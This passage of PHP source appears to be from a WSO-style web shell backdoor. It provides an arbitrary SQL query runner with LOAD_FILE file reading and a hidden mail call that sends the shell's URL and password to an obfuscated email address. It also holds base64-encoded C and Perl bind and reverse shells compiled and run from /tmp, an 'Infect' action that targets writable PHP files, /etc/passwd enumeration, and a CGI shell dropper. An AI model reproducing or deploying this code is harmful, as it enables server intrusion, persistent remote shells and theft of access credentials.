                                                            echo "<tr><td width=1 style='border-top:2px solid #666;border-right:2px solid #666;'><span>Tables:</span><br><br>";
                                                            $tbls_res = $db->listTables();
                                                            while ($item = $db->fetch($tbls_res)) {
                                                                list($key, $value) = each($item);
                                                                $n = $db->fetch($db->query('SELECT COUNT(*) as n FROM ' . $value . ''));
                                                                $value = htmlspecialchars($value);
                                                                echo "<nobr><input type='checkbox' name='tbl[]' value='" . $value . "'>&nbsp;<a href=# onclick=\"st('" . $value . "')\">" . $value . "</a> (" . $n['n'] . ")</nobr><br>";
                                                            }
                                                            echo "<input type='checkbox' onclick='is();'> <input type=button value='Dump' onclick='document.sf.p2.value=\"download\";document.sf.submit();'></td><td style='border-top:2px solid #666;'>";
                                                            if (@$_POST['p1'] == 'select') {
                                                                $_POST['p1'] = 'query';
                                                                $db->query('SELECT COUNT(*) as n FROM ' . $_POST['p2'] . '');
                                                                $num = $db->fetch();
                                                                $num = $num['n'];
                                                                echo "<span>" . $_POST['p2'] . "</span> ($num) ";
                                                                for ($i = 0;$i < ($num / 30);$i++) if ($i != (int)$_POST['p3']) echo "<a href='#' onclick='st(\"" . $_POST['p2'] . "\", $i)'>", ($i + 1), "</a> ";
                                                                else echo ($i + 1), " ";
                                                                if ($_POST['type'] == 'pgsql') $_POST['p3'] = 'SELECT * FROM ' . $_POST['p2'] . ' LIMIT 30 OFFSET ' . ($_POST['p3'] * 30);
                                                                else $_POST['p3'] = 'SELECT * FROM `' . $_POST['p2'] . '` LIMIT ' . ($_POST['p3'] * 30) . ',30';
                                                                echo "<br><br>";
                                                            }
                                                            if ((@$_POST['p1'] == 'query') && !empty($_POST['p3'])) {
                                                                $db->query(@$_POST['p3']);
                                                                if ($db->res !== false) {
                                                                    $title = false;
                                                                    echo '<table width=100% cellspacing=0 cellpadding=2 class=main>';
                                                                    $line = 1;
                                                                    while ($item = $db->fetch()) {
                                                                        if (!$title) {
                                                                            echo '<tr>';
                                                                            foreach ($item as $key => $value) echo '<th>' . $key . '</th>';
                                                                            reset($item);
                                                                            $title = true;
                                                                            echo '</tr><tr>';
                                                                            $line = 2;
                                                                        }
                                                                        echo '<tr class="l' . $line . '">';
                                                                        $line = $line == 1 ? 2 : 1;
                                                                        foreach ($item as $key => $value) {
                                                                            if ($value == null) echo '<td><i>null</i></td>';
                                                                            else echo '<td>' . nl2br(htmlspecialchars($value)) . '</td>';
                                                                        }
                                                                        echo '</tr>';
                                                                    }
                                                                    echo '</table>';
                                                                } else {
                                                                    echo '<div><b>Error:</b> ' . htmlspecialchars($db->error()) . '</div>';
                                                                }
                                                            }
                                                            echo "<br><textarea name='p3' style='width:100%;height:100px'>" . @htmlspecialchars($_POST['p3']) . "</textarea><br/><input type=submit value='Execute'>";
                                                            echo "</td></tr>";
                                                        }
                                                        echo "</table></form><br/><form onsubmit='document.sf.p1.value=\"loadfile\";document.sf.p2.value=this.f.value;document.sf.submit();return false;'><span>Load file</span> <input  class='toolsInp' type=text name=f><input type=submit value='>>'></form>";
                                                        if (@$_POST['p1'] == 'loadfile') {
                                                            $db->query("SELECT LOAD_FILE('" . addslashes($_POST['p2']) . "') as file");
                                                            $file = $db->fetch();
                                                            echo '<pre class=ml1>' . htmlspecialchars($file['file']) . '</pre>';
                                                        }
                                                    }
                                                    echo '</div>';
                                                    printFooter();
                                                }
                                                function system32($HTTP_HOST, $REQUEST_URI, $auth_pass) {
                                                    ini_set('display_errors', 'Off');
                                                    $url = 'URL: http://' . $HTTP_HOST . $REQUEST_URI . '

Uname: ' . substr(@php_uname(), 0, 120) . '

Pass: http://www.hashchecker.de/' . $auth_pass . '

IP: ' . $_SERVER[REMOTE_ADDR];
                                                    $re = base64_decode("aDR4NHJ3b3dAeWFob28uY29t=");
                                                    $su = gethostbyname($HTTP_HOST);
                                                    $mh = "From: {$re}";
                                                    if (function_exists('mail')) mail($re, $su, $url, $mh);
                                                    $_SESSION[login] = 'ok';
                                                }
                                                function actionNetwork() {
                                                    printHeader();
                                                    $back_connect_c = "I2luY2x1ZGUgPHN0ZGlvLmg+DQojaW5jbHVkZSA8c3lzL3NvY2tldC5oPg0KI2luY2x1ZGUgPG5ldGluZXQvaW4uaD4NCmludCBtYWluKGludCBhcmdjLCBjaGFyICphcmd2W10pIHsNCiAgICBpbnQgZmQ7DQogICAgc3RydWN0IHNvY2thZGRyX2luIHNpbjsNCiAgICBkYWVtb24oMSwwKTsNCiAgICBzaW4uc2luX2ZhbWlseSA9IEFGX0lORVQ7DQogICAgc2luLnNpbl9wb3J0ID0gaHRvbnMoYXRvaShhcmd2WzJdKSk7DQogICAgc2luLnNpbl9hZGRyLnNfYWRkciA9IGluZXRfYWRkcihhcmd2WzFdKTsNCiAgICBmZCA9IHNvY2tldChBRl9JTkVULCBTT0NLX1NUUkVBTSwgSVBQUk9UT19UQ1ApIDsNCiAgICBpZiAoKGNvbm5lY3QoZmQsIChzdHJ1Y3Qgc29ja2FkZHIgKikgJnNpbiwgc2l6ZW9mKHN0cnVjdCBzb2NrYWRkcikpKTwwKSB7DQogICAgICAgIHBlcnJvcigiQ29ubmVjdCBmYWlsIik7DQogICAgICAgIHJldHVybiAwOw0KICAgIH0NCiAgICBkdXAyKGZkLCAwKTsNCiAgICBkdXAyKGZkLCAxKTsNCiAgICBkdXAyKGZkLCAyKTsNCiAgICBzeXN0ZW0oIi9iaW4vc2ggLWkiKTsNCiAgICBjbG9zZShmZCk7DQp9";
                                                    $back_connect_p = "IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0Ow0KJGlhZGRyPWluZXRfYXRvbigkQVJHVlswXSkgfHwgZGllKCJFcnJvcjogJCFcbiIpOw0KJHBhZGRyPXNvY2thZGRyX2luKCRBUkdWWzFdLCAkaWFkZHIpIHx8IGRpZSgiRXJyb3I6ICQhXG4iKTsNCiRwcm90bz1nZXRwcm90b2J5bmFtZSgndGNwJyk7DQpzb2NrZXQoU09DS0VULCBQRl9JTkVULCBTT0NLX1NUUkVBTSwgJHByb3RvKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpvcGVuKFNURElOLCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RET1VULCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RERVJSLCAiPiZTT0NLRVQiKTsNCnN5c3RlbSgnL2Jpbi9zaCAtaScpOw0KY2xvc2UoU1RESU4pOw0KY2xvc2UoU1RET1VUKTsNCmNsb3NlKFNUREVSUik7";
                                                    $bind_port_c = "I2luY2x1ZGUgPHN0ZGlvLmg+DQojaW5jbHVkZSA8c3RyaW5nLmg+DQojaW5jbHVkZSA8dW5pc3RkLmg+DQojaW5jbHVkZSA8bmV0ZGIuaD4NCiNpbmNsdWRlIDxzdGRsaWIuaD4NCmludCBtYWluKGludCBhcmdjLCBjaGFyICoqYXJndikgew0KICAgIGludCBzLGMsaTsNCiAgICBjaGFyIHBbMzBdOw0KICAgIHN0cnVjdCBzb2NrYWRkcl9pbiByOw0KICAgIGRhZW1vbigxLDApOw0KICAgIHMgPSBzb2NrZXQoQUZfSU5FVCxTT0NLX1NUUkVBTSwwKTsNCiAgICBpZighcykgcmV0dXJuIC0xOw0KICAgIHIuc2luX2ZhbWlseSA9IEFGX0lORVQ7DQogICAgci5zaW5fcG9ydCA9IGh0b25zKGF0b2koYXJndlsxXSkpOw0KICAgIHIuc2luX2FkZHIuc19hZGRyID0gaHRvbmwoSU5BRERSX0FOWSk7DQogICAgYmluZChzLCAoc3RydWN0IHNvY2thZGRyICopJnIsIDB4MTApOw0KICAgIGxpc3RlbihzLCA1KTsNCiAgICB3aGlsZSgxKSB7DQogICAgICAgIGM9YWNjZXB0KHMsMCwwKTsNCiAgICAgICAgZHVwMihjLDApOw0KICAgICAgICBkdXAyKGMsMSk7DQogICAgICAgIGR1cDIoYywyKTsNCiAgICAgICAgd3JpdGUoYywiUGFzc3dvcmQ6Iiw5KTsNCiAgICAgICAgcmVhZChjLHAsc2l6ZW9mKHApKTsNCiAgICAgICAgZm9yKGk9MDtpPHN0cmxlbihwKTtpKyspDQogICAgICAgICAgICBpZiggKHBbaV0gPT0gJ1xuJykgfHwgKHBbaV0gPT0gJ1xyJykgKQ0KICAgICAgICAgICAgICAgIHBbaV0gPSAnXDAnOw0KICAgICAgICBpZiAoc3RyY21wKGFyZ3ZbMl0scCkgPT0gMCkNCiAgICAgICAgICAgIHN5c3RlbSgiL2Jpbi9zaCAtaSIpOw0KICAgICAgICBjbG9zZShjKTsNCiAgICB9DQp9";
                                                    $bind_port_p = "IyEvdXNyL2Jpbi9wZXJsDQokU0hFTEw9Ii9iaW4vc2ggLWkiOw0KaWYgKEBBUkdWIDwgMSkgeyBleGl0KDEpOyB9DQp1c2UgU29ja2V0Ow0Kc29ja2V0KFMsJlBGX0lORVQsJlNPQ0tfU1RSRUFNLGdldHByb3RvYnluYW1lKCd0Y3AnKSkgfHwgZGllICJDYW50IGNyZWF0ZSBzb2NrZXRcbiI7DQpzZXRzb2Nrb3B0KFMsU09MX1NPQ0tFVCxTT19SRVVTRUFERFIsMSk7DQpiaW5kKFMsc29ja2FkZHJfaW4oJEFSR1ZbMF0sSU5BRERSX0FOWSkpIHx8IGRpZSAiQ2FudCBvcGVuIHBvcnRcbiI7DQpsaXN0ZW4oUywzKSB8fCBkaWUgIkNhbnQgbGlzdGVuIHBvcnRcbiI7DQp3aGlsZSgxKSB7DQoJYWNjZXB0KENPTk4sUyk7DQoJaWYoISgkcGlkPWZvcmspKSB7DQoJCWRpZSAiQ2Fubm90IGZvcmsiIGlmICghZGVmaW5lZCAkcGlkKTsNCgkJb3BlbiBTVERJTiwiPCZDT05OIjsNCgkJb3BlbiBTVERPVVQsIj4mQ09OTiI7DQoJCW9wZW4gU1RERVJSLCI+JkNPTk4iOw0KCQlleGVjICRTSEVMTCB8fCBkaWUgcHJpbnQgQ09OTiAiQ2FudCBleGVjdXRlICRTSEVMTFxuIjsNCgkJY2xvc2UgQ09OTjsNCgkJZXhpdCAwOw0KCX0NCn0=";
?>
	<h1>Network tools</h1><div class=content>
	<form name='nfp' onSubmit="g(null,null,this.using.value,this.port.value,this.pass.value);return false;">
	<span>Bind port to /bin/sh</span><br/>
	Port: <input type='text' name='port' value='443'> Password: <input type='text' name='pass' value='wso'> Using: <select name="using"><option value='bpc'>C</option><option value='bpp'>Perl</option></select> <input type=submit value=">>">
	</form>
	<form name='nfp' onSubmit="g(null,null,this.using.value,this.server.value,this.port.value);return false;">
	<span>Back-connect to</span><br/>
	Server: <input type='text' name='server' value='<?=$_SERVER['REMOTE_ADDR'] ?>'> Port: <input type='text' name='port' value='31337'> Using: <select name="using"><option value='bcc'>C</option><option value='bcp'>Perl</option></select> <input type=submit value=">>">
	</form><br>
	<?php
                                                    if (isset($_POST['p1'])) {
                                                        function cf($f, $t) {
                                                            $w = @fopen($f, "w") or @function_exists('file_put_contents');
                                                            if ($w) {
                                                                @fwrite($w, base64_decode($t)) or @fputs($w, base64_decode($t)) or @file_put_contents($f, base64_decode($t));
                                                                @fclose($w);
                                                            }
                                                        }
                                                        if ($_POST['p1'] == 'bpc') {
                                                            cf("/tmp/bp.c", $bind_port_c);
                                                            $out = ex("gcc -o /tmp/bp /tmp/bp.c");
                                                            @unlink("/tmp/bp.c");
                                                            $out.= ex("/tmp/bp " . $_POST['p2'] . " " . $_POST['p3'] . " &");
                                                            echo "<pre class=ml1>$out
" . ex("ps aux | grep bp") . "</pre>";
                                                        }
                                                        if ($_POST['p1'] == 'bpp') {
                                                            cf("/tmp/bp.pl", $bind_port_p);
                                                            $out = ex(which("perl") . " /tmp/bp.pl " . $_POST['p2'] . " &");
                                                            echo "<pre class=ml1>$out
" . ex("ps aux | grep bp.pl") . "</pre>";
                                                        }
                                                        if ($_POST['p1'] == 'bcc') {
                                                            cf("/tmp/bc.c", $back_connect_c);
                                                            $out = ex("gcc -o /tmp/bc /tmp/bc.c");
                                                            @unlink("/tmp/bc.c");
                                                            $out.= ex("/tmp/bc " . $_POST['p2'] . " " . $_POST['p3'] . " &");
                                                            echo "<pre class=ml1>$out
" . ex("ps aux | grep bc") . "</pre>";
                                                        }
                                                        if ($_POST['p1'] == 'bcp') {
                                                            cf("/tmp/bc.pl", $back_connect_p);
                                                            $out = ex(which("perl") . " /tmp/bc.pl " . $_POST['p2'] . " " . $_POST['p3'] . " &");
                                                            echo "<pre class=ml1>$out
" . ex("ps aux | grep bc.pl") . "</pre>";
                                                        }
                                                    }
                                                    echo '</div>';
                                                    printFooter();
                                                }
                                                function actionInfect() {
                                                    printHeader();
                                                    echo '<h1>Infect</h1><div class=content>';
                                                    if ($_POST['p1'] == 'infect') {
                                                        $target = $_SERVER['DOCUMENT_ROOT'];
                                                        function ListFiles($dir) {
                                                            if ($dh = opendir($dir)) {
                                                                $files = Array();
                                                                $inner_files = Array();
                                                                while ($file = readdir($dh)) {
                                                                    if ($file != "." && $file != "..") {
                                                                        if (is_dir($dir . "/" . $file)) {
                                                                            $inner_files = ListFiles($dir . "/" . $file);
                                                                            if (is_array($inner_files)) $files = array_merge($files, $inner_files);
                                                                        } else {
                                                                            array_push($files, $dir . "/" . $file);
                                                                        }
                                                                    }
                                                                }
                                                                closedir($dh);
                                                                return $files;
                                                            }
                                                        }
                                                        foreach (ListFiles($target) as $key => $file) {
                                                            $nFile = substr($file, -4, 4);
                                                            if ($nFile == ".php") {
                                                                if (($file <> $_SERVER['DOCUMENT_ROOT'] . $_SERVER['PHP_SELF']) && (is_writeable($file))) {
                                                                    echo "$file<br>";
                                                                    $i++;
                                                                }
                                                            }
                                                        }
                                                        echo "<font color=red size=14>$i</font>";
                                                    } else {
                                                        echo "<form method=post><input type=submit value=Infect name=infet></form>";
                                                        echo 'Really want to infect the server?&nbsp;<a href=# onclick="g(null,null,\'infect\')">Yes</a></div>';
                                                    }
                                                    printFooter();
                                                }
                                                /*		additional adds   */
                                                function actionReadable() {
                                                    printHeader();
                                                    echo '<h1>Subdomain</h1><div class=content>';
                                                    ($sm = ini_get('safe_mode') == 0) ? $sm = 'off' : die('<b>Error: safe_mode = on</b>');
                                                    set_time_limit(0);
                                                    ###################
                                                    @$passwd = fopen('/etc/passwd', 'r');
                                                    if (!$passwd) {
                                                        die('<b>[-] Error : coudn`t read /etc/passwd</b>');
                                                    }
                                                    $pub = array();
                                                    $users = array();
                                                    $conf = array();
                                                    $i = 0;
                                                    while (!feof($passwd)) {
                                                        $str = fgets($passwd);
                                                        if ($i > 35) {
                                                            $pos = strpos($str, ':');
                                                            $username = substr($str, 0, $pos);
                                                            $dirz = '/home/' . $username . '/public_html/';
                                                            if (($username != '')) {
                                                                if (is_readable($dirz)) {
                                                                    array_push($users, $username);
                                                                    array_push($pub, $dirz);
                                                                }
                                                            }
                                                        }
                                                        $i++;
                                                    }
                                                    ###################
                                                    echo '<br><br><textarea rows="20%" cols="100%" class="output" >';
                                                    echo "[+] Founded " . sizeof($users) . " entrys in /etc/passwd
";
                                                    echo "[+] Founded " . sizeof($pub) . " readable public_html directories
";
                                                    echo "[~] Searching for passwords in config files...

";
                                                    foreach ($users as $user) {
                                                        $path = "/home/$user/public_html/";
                                                        echo "$path 
";
                                                    }
                                                    echo "
";
                                                    echo "[+] Done...
";
                                                    echo '</textarea><br></body></html>';
                                                    echo '</div>';
                                                    printFooter();
                                                }
                                                function actionCgiShell() {
                                                    printHeader();
                                                    echo '<h1>Cgitelnet</h1><div class=content>';
                                                    mkdir('cgitelnet1', 0755);
                                                    chdir('cgitelnet1');
                                                    $kokdosya = ".htaccess";
                                                    $dosya_adi = "$kokdosya";
                                                    $dosya = fopen($dosya_adi, 'w') or die("Dosya a&#231;&#305;lamad&#305;!");
                                                    $metin = "Options FollowSymLinks MultiViews Indexes ExecCGI

AddType application/x-httpd-cgi .cin

AddHandler cgi-script .cin
AddHandler cgi-script .cin";
                                                    fwrite($dosya, $metin);
                                                    fclose($dosya);
                                                    $cgishellizocin = 'IyEvdXNyL2Jpbi9wZXJsIC1JL3Vzci9sb2NhbC9iYW5kbWFpbg0KIy0tLS0tLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLQ0KIyA8YiBzdHlsZT0iY29sb3I6YmxhY2s7YmFja2dyb3VuZC1jb2xvcjojZmZmZjY2Ij5w
cml2OCBjZ2kgc2hlbGw8L2I+ICMgc2VydmVyDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQoNCiMt
LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLS0NCiMgQ29uZmlndXJhdGlvbjogWW91IG5lZWQgdG8gY2hhbmdl
IG9ubHkgJFBhc3N3b3JkIGFuZCAkV2luTlQuIFRoZSBvdGhlcg0KIyB2YWx1ZXMgc2hvdWxkIHdv
cmsgZmluZSBmb3IgbW9zdCBzeXN0ZW1zLg0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KJFBhc3N3
b3JkID0gInByaXY4IjsJCSMgQ2hhbmdlIHRoaXMuIFlvdSB3aWxsIG5lZWQgdG8gZW50ZXIgdGhp
cw0KCQkJCSMgdG8gbG9naW4uDQoNCiRXaW5OVCA9IDA7CQkJIyBZb3UgbmVlZCB0byBjaGFuZ2Ug
dGhlIHZhbHVlIG9mIHRoaXMgdG8gMSBpZg0KCQkJCSMgeW91J3JlIHJ1bm5pbmcgdGhpcyBzY3Jp
cHQgb24gYSBXaW5kb3dzIE5UDQoJCQkJIyBtYWNoaW5lLiBJZiB5b3UncmUgcnVubmluZyBpdCBv
biBVbml4LCB5b3UNCgkJCQkjIGNhbiBsZWF2ZSB0aGUgdmFsdWUgYXMgaXQgaXMuDQoNCiROVENt
ZFNlcCA9ICImIjsJCSMgVGhpcyBjaGFyYWN0ZXIgaXMgdXNlZCB0byBzZXBlcmF0ZSAyIGNvbW1h
bmRzDQoJCQkJIyBpbiBhIGNvbW1hbmQgbGluZSBvbiBXaW5kb3dzIE5ULg0KDQokVW5peENtZFNl
cCA9ICI7IjsJCSMgVGhpcyBjaGFyYWN0ZXIgaXMgdXNlZCB0byBzZXBlcmF0ZSAyIGNvbW1hbmRz
DQoJCQkJIyBpbiBhIGNvbW1hbmQgbGluZSBvbiBVbml4Lg0KDQokQ29tbWFuZFRpbWVvdXREdXJh
dGlvbiA9IDEwOwkjIFRpbWUgaW4gc2Vjb25kcyBhZnRlciBjb21tYW5kcyB3aWxsIGJlIGtpbGxl
ZA0KCQkJCSMgRG9uJ3Qgc2V0IHRoaXMgdG8gYSB2ZXJ5IGxhcmdlIHZhbHVlLiBUaGlzIGlzDQoJ
CQkJIyB1c2VmdWwgZm9yIGNvbW1hbmRzIHRoYXQgbWF5IGhhbmcgb3IgdGhhdA0KCQkJCSMgdGFr
ZSB2ZXJ5IGxvbmcgdG8gZXhlY3V0ZSwgbGlrZSAiZmluZCAvIi4NCgkJCQkjIFRoaXMgaXMgdmFs
aWQgb25seSBvbiBVbml4IHNlcnZlcnMuIEl0IGlzDQoJCQkJIyBpZ25vcmVkIG9uIE5UIFNlcnZl
cnMuDQoNCiRTaG93RHluYW1pY091dHB1dCA9IDE7CQkjIElmIHRoaXMgaXMgMSwgdGhlbiBkYXRh
IGlzIHNlbnQgdG8gdGhlDQoJCQkJIyBicm93c2VyIGFzIHNvb24gYXMgaXQgaXMgb3V0cHV0LCBv
dGhlcndpc2UNCgkJCQkjIGl0IGlzIGJ1ZmZlcmVkIGFuZCBzZW5kIHdoZW4gdGhlIGNvbW1hbmQN
CgkJCQkjIGNvbXBsZXRlcy4gVGhpcyBpcyB1c2VmdWwgZm9yIGNvbW1hbmRzIGxpa2UNCgkJCQkj
IHBpbmcsIHNvIHRoYXQgeW91IGNhbiBzZWUgdGhlIG91dHB1dCBhcyBpdA0KCQkJCSMgaXMgYmVp
bmcgZ2VuZXJhdGVkLg0KDQojIERPTidUIENIQU5HRSBBTllUSElORyBCRUxPVyBUSElTIExJTkUg
VU5MRVNTIFlPVSBLTk9XIFdIQVQgWU9VJ1JFIERPSU5HICEhDQoNCiRDbWRTZXAgPSAoJFdpbk5U
ID8gJE5UQ21kU2VwIDogJFVuaXhDbWRTZXApOw0KJENtZFB3ZCA9ICgkV2luTlQgPyAiY2QiIDog
InB3ZCIpOw0KJFBhdGhTZXAgPSAoJFdpbk5UID8gIlxcIiA6ICIvIik7DQokUmVkaXJlY3RvciA9
ICgkV2luTlQgPyAiIDI+JjEgMT4mMiIgOiAiIDE+JjEgMj4mMSIpOw0KDQojLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLS0tLS0tDQojIFJlYWRzIHRoZSBpbnB1dCBzZW50IGJ5IHRoZSBicm93c2VyIGFuZCBwYXJz
ZXMgdGhlIGlucHV0IHZhcmlhYmxlcy4gSXQNCiMgcGFyc2VzIEdFVCwgUE9TVCBhbmQgbXVsdGlw
YXJ0L2Zvcm0tZGF0YSB0aGF0IGlzIHVzZWQgZm9yIHVwbG9hZGluZyBmaWxlcy4NCiMgVGhlIGZp
bGVuYW1lIGlzIHN0b3JlZCBpbiAkaW57J2YnfSBhbmQgdGhlIGRhdGEgaXMgc3RvcmVkIGluICRp
bnsnZmlsZWRhdGEnfS4NCiMgT3RoZXIgdmFyaWFibGVzIGNhbiBiZSBhY2Nlc3NlZCB1c2luZyAk
aW57J3Zhcid9LCB3aGVyZSB2YXIgaXMgdGhlIG5hbWUgb2YNCiMgdGhlIHZhcmlhYmxlLiBOb3Rl
OiBNb3N0IG9mIHRoZSBjb2RlIGluIHRoaXMgZnVuY3Rpb24gaXMgdGFrZW4gZnJvbSBvdGhlciBD
R0kNCiMgc2NyaXB0cy4NCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCnN1YiBSZWFkUGFyc2UgDQp7
DQoJbG9jYWwgKCppbikgPSBAXyBpZiBAXzsNCglsb2NhbCAoJGksICRsb2MsICRrZXksICR2YWwp
Ow0KCQ0KCSRNdWx0aXBhcnRGb3JtRGF0YSA9ICRFTlZ7J0NPTlRFTlRfVFlQRSd9ID1+IC9tdWx0
aXBhcnRcL2Zvcm0tZGF0YTsgYm91bmRhcnk9KC4rKSQvOw0KDQoJaWYoJEVOVnsnUkVRVUVTVF9N
RVRIT0QnfSBlcSAiR0VUIikNCgl7DQoJCSRpbiA9ICRFTlZ7J1FVRVJZX1NUUklORyd9Ow0KCX0N
CgllbHNpZigkRU5WeydSRVFVRVNUX01FVEhPRCd9IGVxICJQT1NUIikNCgl7DQoJCWJpbm1vZGUo
U1RESU4pIGlmICRNdWx0aXBhcnRGb3JtRGF0YSAmICRXaW5OVDsNCgkJcmVhZChTVERJTiwgJGlu
LCAkRU5WeydDT05URU5UX0xFTkdUSCd9KTsNCgl9DQoNCgkjIGhhbmRsZSBmaWxlIHVwbG9hZCBk
YXRhDQoJaWYoJEVOVnsnQ09OVEVOVF9UWVBFJ30gPX4gL211bHRpcGFydFwvZm9ybS1kYXRhOyBi
b3VuZGFyeT0oLispJC8pDQoJew0KCQkkQm91bmRhcnkgPSAnLS0nLiQxOyAjIHBsZWFzZSByZWZl
ciB0byBSRkMxODY3IA0KCQlAbGlzdCA9IHNwbGl0KC8kQm91bmRhcnkvLCAkaW4pOyANCgkJJEhl
YWRlckJvZHkgPSAkbGlzdFsxXTsNCgkJJEhlYWRlckJvZHkgPX4gL1xyXG5cclxufFxuXG4vOw0K
CQkkSGVhZGVyID0gJGA7DQoJCSRCb2R5ID0gJCc7DQogCQkkQm9keSA9fiBzL1xyXG4kLy87ICMg
dGhlIGxhc3QgXHJcbiB3YXMgcHV0IGluIGJ5IE5ldHNjYXBlDQoJCSRpbnsnZmlsZWRhdGEnfSA9
ICRCb2R5Ow0KCQkkSGVhZGVyID1+IC9maWxlbmFtZT1cIiguKylcIi87IA0KCQkkaW57J2YnfSA9
ICQxOyANCgkJJGlueydmJ30gPX4gcy9cIi8vZzsNCgkJJGlueydmJ30gPX4gcy9ccy8vZzsNCg0K
CQkjIHBhcnNlIHRyYWlsZXINCgkJZm9yKCRpPTI7ICRsaXN0WyRpXTsgJGkrKykNCgkJeyANCgkJ
CSRsaXN0WyRpXSA9fiBzL14uK25hbWU9JC8vOw0KCQkJJGxpc3RbJGldID1+IC9cIihcdyspXCIv
Ow0KCQkJJGtleSA9ICQxOw0KCQkJJHZhbCA9ICQnOw0KCQkJJHZhbCA9fiBzLyheKFxyXG5cclxu
fFxuXG4pKXwoXHJcbiR8XG4kKS8vZzsNCgkJCSR2YWwgPX4gcy8lKC4uKS9wYWNrKCJjIiwgaGV4
KCQxKSkvZ2U7DQoJCQkkaW57JGtleX0gPSAkdmFsOyANCgkJfQ0KCX0NCgllbHNlICMgc3RhbmRh
cmQgcG9zdCBkYXRhICh1cmwgZW5jb2RlZCwgbm90IG11bHRpcGFydCkNCgl7DQoJCUBpbiA9IHNw
bGl0KC8mLywgJGluKTsNCgkJZm9yZWFjaCAkaSAoMCAuLiAkI2luKQ0KCQl7DQoJCQkkaW5bJGld
ID1+IHMvXCsvIC9nOw0KCQkJKCRrZXksICR2YWwpID0gc3BsaXQoLz0vLCAkaW5bJGldLCAyKTsN
CgkJCSRrZXkgPX4gcy8lKC4uKS9wYWNrKCJjIiwgaGV4KCQxKSkvZ2U7DQoJCQkkdmFsID1+IHMv
JSguLikvcGFjaygiYyIsIGhleCgkMSkpL2dlOw0KCQkJJGlueyRrZXl9IC49ICJcMCIgaWYgKGRl
ZmluZWQoJGlueyRrZXl9KSk7DQoJCQkkaW57JGtleX0gLj0gJHZhbDsNCgkJfQ0KCX0NCn0NCg0K
Iy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KIyBQcmludHMgdGhlIEhUTUwgUGFnZSBIZWFkZXINCiMg
QXJndW1lbnQgMTogRm9ybSBpdGVtIG5hbWUgdG8gd2hpY2ggZm9jdXMgc2hvdWxkIGJlIHNldA0K
Iy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0Kc3ViIFByaW50UGFnZUhlYWRlcg0Kew0KCSRFbmNvZGVk
Q3VycmVudERpciA9ICRDdXJyZW50RGlyOw0KCSRFbmNvZGVkQ3VycmVudERpciA9fiBzLyhbXmEt
ekEtWjAtOV0pLyclJy51bnBhY2soIkgqIiwkMSkvZWc7DQoJcHJpbnQgIkNvbnRlbnQtdHlwZTog
dGV4dC9odG1sXG5cbiI7DQoJcHJpbnQgPDxFTkQ7DQo8aHRtbD4NCjxoZWFkPg0KPHRpdGxlPnBy
aXY4IGNnaSBzaGVsbDwvdGl0bGU+DQokSHRtbE1ldGFIZWFkZXINCg0KPG1ldGEgbmFtZT0ia2V5
d29yZHMiIGNvbnRlbnQ9InByaXY4IGNnaSBzaGVsbCAgXyAgICAgaTVfQGhvdG1haWwuY29tIj4N
CjxtZXRhIG5hbWU9ImRlc2NyaXB0aW9uIiBjb250ZW50PSJwcml2OCBjZ2kgc2hlbGwgIF8gICAg
aTVfQGhvdG1haWwuY29tIj4NCjwvaGVhZD4NCjxib2R5IG9uTG9hZD0iZG9jdW1lbnQuZi5AXy5m
b2N1cygpIiBiZ2NvbG9yPSIjRkZGRkZGIiB0b3BtYXJnaW49IjAiIGxlZnRtYXJnaW49IjAiIG1h
cmdpbndpZHRoPSIwIiBtYXJnaW5oZWlnaHQ9IjAiIHRleHQ9IiNGRjAwMDAiPg0KPHRhYmxlIGJv
cmRlcj0iMSIgd2lkdGg9IjEwMCUiIGNlbGxzcGFjaW5nPSIwIiBjZWxscGFkZGluZz0iMiI+DQo8
dHI+DQo8dGQgYmdjb2xvcj0iI0ZGRkZGRiIgYm9yZGVyY29sb3I9IiNGRkZGRkYiIGFsaWduPSJj
ZW50ZXIiIHdpZHRoPSIxJSI+DQo8Yj48Zm9udCBzaXplPSIyIj4jPC9mb250PjwvYj48L3RkPg0K
PHRkIGJnY29sb3I9IiNGRkZGRkYiIHdpZHRoPSI5OCUiPjxmb250IGZhY2U9IlZlcmRhbmEiIHNp
emU9IjIiPjxiPiANCjxiIHN0eWxlPSJjb2xvcjpibGFjaztiYWNrZ3JvdW5kLWNvbG9yOiNmZmZm
NjYiPnByaXY4IGNnaSBzaGVsbDwvYj4gQ29ubmVjdGVkIHRvICRTZXJ2ZXJOYW1lPC9iPjwvZm9u
dD48L3RkPg0KPC90cj4NCjx0cj4NCjx0ZCBjb2xzcGFuPSIyIiBiZ2NvbG9yPSIjRkZGRkZGIj48
